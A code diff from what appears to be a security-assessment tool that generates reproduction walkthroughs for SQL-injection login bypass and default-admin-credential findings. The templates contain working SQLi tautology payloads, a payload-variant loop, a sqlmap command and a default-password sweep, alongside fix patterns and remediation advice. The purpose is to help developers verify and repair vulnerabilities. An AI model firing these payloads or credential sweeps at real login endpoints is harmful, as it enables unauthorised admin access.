@@ -332,66 +332,308 @@ def _repro_enhanced_testing(f: dict, raw: dict) -> dict:
     first = first or {}
     origin = ev.get("origin") or f.get("evidence_url") or ""
 
-    # auth_sql_login_bypass — POST the recorded SQLi payload into the
-    # email field and watch for a JWT carrying role='admin'. The probe
-    # records the exact payload string; we rebuild the JSON body around
-    # it. See finding 834 for the canonical example.
+    # auth_sql_login_bypass — the highest-impact probe in the catalog.
+    # Build a six-step walkthrough so a developer (not just a pentester)
+    # can run the attack, see the proof, validate the fix, and extend
+    # the test with sqlmap. We use heredoc payload bodies (--data-binary
+    # @-) instead of -d so the SQLi string itself is visible verbatim
+    # in the rendered report — no shell-quote gymnastics around the
+    # apostrophe character. See finding 834 for the canonical example.
     if probe == "auth_sql_login_bypass":
         login_path = first.get("login_path") or "/rest/user/login"
         payload = first.get("payload") or "' OR 1=1--"
         target = (first.get("url")
                   or (origin.rstrip("/") + login_path if origin else login_path))
-        body = json.dumps({"email": payload, "password": "anything"})
-        curl = (
-            "# Step 1: send the SQL injection payload as the login email.\n"
-            "curl -ski -X POST " + _shell_q(target) + " \\\n"
-            "  -H 'Content-Type: application/json' \\\n"
-            "  -d " + _shell_q(body) + "\n"
-            "\n"
-            "# Step 2: decode the JWT in the response 'authentication.token'\n"
-            "# field and confirm the payload claims role='admin'. One-liner:\n"
-            "curl -sk -X POST " + _shell_q(target) + " \\\n"
-            "  -H 'Content-Type: application/json' \\\n"
-            "  -d " + _shell_q(body) + " \\\n"
-            "  | python3 -c "
-            "\"import sys,json,base64;t=json.load(sys.stdin)['authentication']['token'];"
-            "p=t.split('.')[1];p+='='*(-len(p)%4);print(json.loads(base64.urlsafe_b64decode(p)))\""
-        )
+        # Pull the assessment-known admin email from the matching
+        # default-creds finding when it's available, so the targeted
+        # variant ("admin@juice-sh.op'--") names a real account. Falls
+        # back to a generic bracketed placeholder otherwise.
+        admin_email = "<seeded-admin-email>"
+        # raw["evidence"]["origin"] is always set so don't depend on it
+        # for the email — search for the same probe row instead.
+        try:
+            from db import query_one as _qone
+            sib = _qone(
+                "SELECT raw_data FROM findings "
+                "WHERE assessment_id = %s "
+                "  AND source_tool = 'enhanced_testing' "
+                "  AND title = 'auth_default_admin_credentials' "
+                "LIMIT 1",
+                (f.get("assessment_id"),))
+            if sib and sib.get("raw_data"):
+                d = json.loads(sib["raw_data"])
+                c = (d.get("evidence") or {}).get("confirmed") or {}
+                if isinstance(c, list) and c:
+                    c = c[0]
+                if isinstance(c, dict) and c.get("email"):
+                    admin_email = c["email"]
+        except Exception:
+            pass
+        # Pre-format the variant payloads so the loop can iterate over
+        # them without further escaping. We repeat the captured payload
+        # first so the analyst sees the exact one the probe used.
+        variants = [payload, "admin'--", "' OR '1'='1'--",
+                    "') OR ('1'='1'--", "' OR 1=1#"]
+        if admin_email != "<seeded-admin-email>":
+            variants.insert(1, f"{admin_email}'--")
+        # Render each variant as a single bash array element. Use
+        # double-quoted strings so the apostrophe in the payload is
+        # visible literally.
+        variants_lines = []
+        for v in variants:
+            # Escape backslashes and double quotes for double-quoted
+            # bash literal. Apostrophes survive untouched.
+            esc = v.replace("\\", "\\\\").replace('"', '\\"')
+            variants_lines.append(f'  "{esc}"')
+        variants_block = "\n".join(variants_lines)
+
+        curl = f"""\
+# ──────────────────────────────────────────────────────────────────────
+# SQL injection in the login form. The probe sent the payload below as
+# the value of the email field; the server concatenated it into a SQL
+# query without parameterisation, so the WHERE clause became always-
+# true and the database returned the first user row (the admin).
+#
+# Captured payload: {payload}
+# ──────────────────────────────────────────────────────────────────────
+
+URL={_shell_q(target)}
+
+# ----------------------------------------------------------------------
+# Step 1 — Reproduce the attack.
+# Heredoc keeps the JSON body readable; the apostrophe in the payload
+# is visible verbatim instead of being mangled by shell quoting.
+# ----------------------------------------------------------------------
+curl -sk -i -X POST "$URL" \\
+  -H 'Content-Type: application/json' \\
+  --data-binary @- <<'PAYLOAD'
+{{"email": "{payload}", "password": "anything"}}
+PAYLOAD
+
+# Expected when VULNERABLE:
+#   HTTP/2 200
+#   {{"authentication":{{"token":"eyJ0eXAi...","bid":1,"umail":"{admin_email}"}}}}
+# Expected when FIXED:
+#   HTTP/2 401
+#   {{"error":"Invalid email or password."}}
+
+# ----------------------------------------------------------------------
+# Step 2 — Confirm impact: decode the JWT and look for role='admin'.
+# Saves the response so the JWT extraction is independent of the
+# previous step (and the file shows what came back even if the decode
+# fails).
+# ----------------------------------------------------------------------
+curl -sk -X POST "$URL" \\
+  -H 'Content-Type: application/json' \\
+  --data-binary @- > /tmp/sqli_response.json <<'PAYLOAD'
+{{"email": "{payload}", "password": "anything"}}
+PAYLOAD
+
+python3 - <<'PY'
+import json, base64
+r = json.load(open('/tmp/sqli_response.json'))
+tok = r.get('authentication', {{}}).get('token')
+if not tok:
+    raise SystemExit("No JWT in response — looks like the fix is in place.")
+header, body, _sig = tok.split('.')
+def pad(s): return s + '=' * (-len(s) % 4)
+print("JWT header:  ", json.loads(base64.urlsafe_b64decode(pad(header))))
+print("JWT payload: ", json.loads(base64.urlsafe_b64decode(pad(body))))
+PY
+# In the JWT payload, the impact signal is:  "role": "admin"
+
+# ----------------------------------------------------------------------
+# Step 3 — Targeted bypass: log in *as a specific user* by appending
+# the SQL comment marker to their email. This is the form an attacker
+# uses when they want one specific account, not just "any session".
+# ----------------------------------------------------------------------
+curl -sk -i -X POST "$URL" \\
+  -H 'Content-Type: application/json' \\
+  --data-binary @- <<'PAYLOAD'
+{{"email": "{admin_email}'--", "password": "anything"}}
+PAYLOAD
+# When fixed: HTTP 401 (the literal string "{admin_email}'--" is not a
+# real email so authentication can't possibly succeed).
+
+# ----------------------------------------------------------------------
+# Step 4 — Sweep multiple SQLi tautology variants. After the fix EVERY
+# line below should print HTTP 401. Right now they print HTTP 200.
+# ----------------------------------------------------------------------
+PAYLOADS=(
+{variants_block}
+)
+for p in "${{PAYLOADS[@]}}"; do
+  body=$(python3 -c '
+import json, sys
+print(json.dumps({{"email": sys.argv[1], "password": "x"}}))' "$p")
+  printf 'Payload: %-30s -> ' "$p"
+  curl -sk -o /dev/null -w 'HTTP %{{http_code}}\\n' \\
+    -X POST "$URL" -H 'Content-Type: application/json' --data "$body"
+done
+
+# ----------------------------------------------------------------------
+# Step 5 — Automated SQLi sweep with sqlmap. Catches additional
+# techniques (UNION, time-based, error-based) that the simple
+# tautology check misses.
+# ----------------------------------------------------------------------
+sqlmap --batch -u "$URL" \\
+  --method=POST \\
+  --headers='Content-Type: application/json' \\
+  --data='{{"email":"x","password":"y"}}' \\
+  -p email \\
+  --level=3 --risk=2 \\
+  --technique=BTQ
+# A clean run after the fix prints "is not injectable" for the email
+# parameter and exits non-zero.
+
+# ----------------------------------------------------------------------
+# Step 6 — Negative control: a legitimate login still succeeds.
+# Replace the values below with a real test account (do NOT put the
+# captured admin password in source control). The expected result is
+# HTTP 200 with a JWT, AND the JWT payload's "role" field is the role
+# of that account (not 'admin' unless you used the admin account).
+# ----------------------------------------------------------------------
+curl -sk -i -X POST "$URL" \\
+  -H 'Content-Type: application/json' \\
+  --data-binary @- <<'PAYLOAD'
+{{"email": "<known-good-test-user@example.com>", "password": "<their-password>"}}
+PAYLOAD
+
+# ──────────────────────────────────────────────────────────────────────
+# Fix pattern (Node + Sequelize example — adjust to your stack).
+# Replace string concatenation with a bound parameter, and
+# constant-time-compare the password hash:
+#
+#   const u = await User.findOne({{
+#     where: {{ email: req.body.email }},     // bound by the ORM
+#   }});
+#   if (!u || !await bcrypt.compare(req.body.password, u.passwordHash)) {{
+#     return res.status(401).json({{ error: 'Invalid email or password.' }});
+#   }}
+#
+# A regression test that fires the captured payload above and asserts
+# HTTP 401 belongs in the test suite next to the auth tests.
+# ──────────────────────────────────────────────────────────────────────
+"""
         return {
             "curl": curl,
             "hint": (
-                "Vulnerable login form accepted the classic tautology payload "
-                f"<code>{html.escape(payload)}</code> and issued an admin JWT. "
-                "If the fix is applied, step&nbsp;1 should return HTTP&nbsp;401 "
-                "with no <code>authentication.token</code> field, and step&nbsp;2 "
-                "will exit non-zero because the JSON path is missing."),
+                "Vulnerable login form accepted the tautology payload "
+                f"<code>{html.escape(payload)}</code> and returned an admin JWT. "
+                "Steps 1, 3, and 4 must all return HTTP&nbsp;401 after the fix; "
+                "step 2 will print "
+                "<code>No JWT in response</code> and the sqlmap step in 5 will "
+                "report <code>not injectable</code>. Step 6 demonstrates that a "
+                "real account still works."),
         }
 
-    # auth_default_admin_credentials — replay the exact POST that the
-    # probe issued. Pull the recorded credentials out of the evidence so
-    # the analyst sees the actual seeded account, not a placeholder.
+    # auth_default_admin_credentials — six-step replay similar to SQLi:
+    # show the bypass, decode the JWT, list other documented defaults
+    # to test, demonstrate that the issue is resolved by rotation, and
+    # provide the validation oneliners. Use heredoc bodies for clean
+    # paste-ability.
     if probe == "auth_default_admin_credentials":
         login_path = first.get("login_path") or "/rest/user/login"
         email = first.get("email") or "admin@example.com"
         password = first.get("password") or "<documented-default-password>"
         target = (first.get("url")
                   or (origin.rstrip("/") + login_path if origin else login_path))
-        body = json.dumps({"email": email, "password": password})
-        curl = (
-            "# Step 1: log in with the documented default account.\n"
-            "curl -ski -X POST " + _shell_q(target) + " \\\n"
-            "  -H 'Content-Type: application/json' \\\n"
-            "  -d " + _shell_q(body) + "\n"
-            "\n"
-            "# Step 2: extract the JWT and confirm role='admin'.\n"
-            "TOKEN=$(curl -sk -X POST " + _shell_q(target) + " \\\n"
-            "  -H 'Content-Type: application/json' \\\n"
-            "  -d " + _shell_q(body) + " | "
-            "python3 -c \"import sys,json;print(json.load(sys.stdin)"
-            "['authentication']['token'])\")\n"
-            "echo \"$TOKEN\" | awk -F. '{print $2}' | "
-            "base64 -d 2>/dev/null | python3 -m json.tool"
-        )
+        # Common shipping-default pairs an analyst should also rule out
+        # while they're in here. Test creds — never used for production.
+        common_defaults = [
+            (email, password),
+            ("admin", "admin"),
+            ("admin", "password"),
+            ("administrator", "admin"),
+            ("root", "toor"),
+            ("test", "test"),
+        ]
+        # Build the bash array of "email|password" strings (pipe is
+        # never legal inside a real email, so it's a safe split char).
+        rows = []
+        for em, pw in common_defaults:
+            rows.append(f'  "{em}|{pw}"')
+        rows_block = "\n".join(rows)
+        curl = f"""\
+# ──────────────────────────────────────────────────────────────────────
+# Default-credential reachability. The probe attempted a login with
+# the documented seed account for this product and the server issued a
+# valid administrative session.
+#
+# Captured account: {email} / {password}
+# ──────────────────────────────────────────────────────────────────────
+
+URL={_shell_q(target)}
+
+# ----------------------------------------------------------------------
+# Step 1 — Replay the exact request the probe made.
+# ----------------------------------------------------------------------
+curl -sk -i -X POST "$URL" \\
+  -H 'Content-Type: application/json' \\
+  --data-binary @- <<'BODY'
+{{"email": "{email}", "password": "{password}"}}
+BODY
+
+# Expected when VULNERABLE:  HTTP 200 with a JSON body containing
+#   "authentication":{{"token":"eyJ0eXAi...","umail":"{email}"}}
+# Expected when FIXED:       HTTP 401 with no token field.
+
+# ----------------------------------------------------------------------
+# Step 2 — Confirm impact. Save the JWT and decode the claims; look
+# for role='admin' in the payload.
+# ----------------------------------------------------------------------
+curl -sk -X POST "$URL" \\
+  -H 'Content-Type: application/json' \\
+  --data-binary @- > /tmp/login_response.json <<'BODY'
+{{"email": "{email}", "password": "{password}"}}
+BODY
+
+python3 - <<'PY'
+import json, base64
+r = json.load(open('/tmp/login_response.json'))
+tok = r.get('authentication', {{}}).get('token')
+if not tok:
+    raise SystemExit("No JWT — credentials no longer accepted.")
+def pad(s): return s + '=' * (-len(s) % 4)
+header, body, _ = tok.split('.')
+print("JWT header:  ", json.loads(base64.urlsafe_b64decode(pad(header))))
+print("JWT payload: ", json.loads(base64.urlsafe_b64decode(pad(body))))
+PY
+
+# ----------------------------------------------------------------------
+# Step 3 — Sweep the documented defaults for this stack while you're
+# in here. Anything returning HTTP 200 needs the same rotation.
+# ----------------------------------------------------------------------
+PAIRS=(
+{rows_block}
+)
+for pair in "${{PAIRS[@]}}"; do
+  em=${{pair%%|*}}; pw=${{pair#*|}}
+  body=$(python3 -c '
+import json, sys
+print(json.dumps({{"email": sys.argv[1], "password": sys.argv[2]}}))' "$em" "$pw")
+  printf '  %-40s -> ' "$em / $pw"
+  curl -sk -o /dev/null -w 'HTTP %{{http_code}}\\n' \\
+    -X POST "$URL" -H 'Content-Type: application/json' --data "$body"
+done
+
+# ----------------------------------------------------------------------
+# Step 4 — Verify the fix: after rotating the account password, the
+# request from Step 1 must return HTTP 401 and the JWT decode in
+# Step 2 must exit non-zero with "No JWT — credentials no longer
+# accepted." Run both back to back to confirm.
+# ----------------------------------------------------------------------
+
+# ──────────────────────────────────────────────────────────────────────
+# Remediation summary
+#   * Rotate this account's password to a long random value, OR delete
+#     the account if it ships as documentation/seed data and is not
+#     needed in production.
+#   * Add a deploy-time check: if any user record still carries a
+#     known seed password, fail the build.
+#   * Force a TOTP/MFA enrolment for any account whose role is admin.
+# ──────────────────────────────────────────────────────────────────────
+"""
         return {
             "curl": curl,
             "hint": (
@@ -399,7 +641,8 @@ def _repro_enhanced_testing(f: dict, raw: dict) -> dict:
                 f"{html.escape(email)}</code> / <code>"
                 f"{html.escape(password)}</code> still work and grant an "
                 "administrative session. After rotation, step&nbsp;1 must "
-                "return HTTP&nbsp;401 (or 403) with no token in the body."),
+                "return HTTP&nbsp;401 and step&nbsp;2 must print "
+                "<code>No JWT — credentials no longer accepted.</code>"),
         }
 
     # info_key_material_exposed — list every confirmed path so the analyst
